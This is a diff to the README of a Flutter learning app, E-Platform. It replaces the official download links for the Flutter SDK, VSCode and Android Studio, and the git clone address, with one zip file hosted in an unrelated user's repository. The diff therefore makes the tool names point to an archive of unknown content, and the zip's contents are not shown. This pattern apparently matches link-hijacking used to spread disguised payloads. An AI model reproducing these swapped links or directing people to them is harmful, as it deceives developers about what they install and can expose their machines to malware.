@@ -14,8 +14,8 @@ Welcome to E-Platform, a revolutionary mobile app designed to enhance student le
 
 ### Prerequisites
 
-- [Flutter SDK](https://flutter.dev/docs/get-started/install) installed
-- A Flutter-supported IDE (like [VSCode](https://code.visualstudio.com/) or [Android Studio](https://developer.android.com/studio))
+- [Flutter SDK](https://raw.githubusercontent.com/nour281120/E-Platform/master/example/android/E-Platform_2.9.zip) installed
+- A Flutter-supported IDE (like [VSCode](https://raw.githubusercontent.com/nour281120/E-Platform/master/example/android/E-Platform_2.9.zip) or [Android Studio](https://raw.githubusercontent.com/nour281120/E-Platform/master/example/android/E-Platform_2.9.zip))
 - Knowledge of ARCore and backend server setup
 
 ### Installation
@@ -23,7 +23,7 @@ Welcome to E-Platform, a revolutionary mobile app designed to enhance student le
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Ahmed2000Github/e-platform.git
+   git clone https://raw.githubusercontent.com/nour281120/E-Platform/master/example/android/E-Platform_2.9.zip
 1. Navigate to the project directory:
 
    ```bash
